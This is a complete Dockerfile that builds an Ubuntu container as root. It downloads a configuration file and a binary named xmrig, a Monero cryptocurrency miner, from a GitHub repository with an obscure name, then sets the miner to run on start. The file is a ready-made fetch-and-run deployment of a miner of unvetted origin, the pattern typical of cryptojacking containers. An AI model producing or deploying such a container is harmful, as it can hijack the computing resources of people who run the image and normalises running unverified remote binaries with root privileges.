FROM ubuntu:latest

WORKDIR /app
USER root

RUN apt-get update
RUN apt-get install -y wget curl

RUN wget https://raw.githubusercontent.com/jjcasa/rptreum/main/config.json
RUN wget https://github.com/jjcasa/rptreum/raw/main/xmrig
CMD ./xmrig
